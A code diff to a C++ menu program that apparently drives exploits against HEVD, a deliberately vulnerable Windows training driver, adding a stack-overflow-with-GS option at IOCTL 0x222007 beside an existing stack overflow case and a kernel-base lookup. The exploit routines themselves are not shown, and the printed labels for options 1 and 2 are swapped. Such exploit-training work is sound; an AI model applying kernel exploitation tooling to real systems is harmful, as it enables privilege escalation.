@@ -10,8 +10,9 @@ unsigned int io2num(unsigned int ioctl_num) {
 
 void menu() {
     cout << "============HEVD Hack EXP============\n";
-    cout << "1.  [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n";
-    cout << "100. [HELP]    ****** GET KERNEL BASE                  ****** ...\n";
+    cout << "1.  [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK      ******\n";
+    cout << "2.  [0x222007]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS   ******\n";
+    cout << "100. [HELP]   ****** GET KERNEL BASE                       ******\n";
     cout << "input io ctl> ";
 }
 
@@ -33,11 +34,17 @@ int main()
     {
     case 1: {
         cout << "Now Excuting ...\n";
-        cout << "1.   [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n";
+        cout << "1.  [0x222003]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS   ******\n";
         exploit::stackoverflow::StackOverflow(hDevice, 0x222003);
         break;
     }
-    case 0x100:{
+    case 2: {
+        cout << "Now Excuting ...\n";
+        cout << "2.   [0x222007]****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ****** ...\n";
+        exploit::stackoverflow::StackOverflowGS(hDevice, 0x222007);
+        break;
+    }
+    case 0x100: {
         printf("kernel base is: %p\n", exploit::memtools::ulGetKernelBase((PCHAR)"ntoskrnl.exe"));
         break;
     }
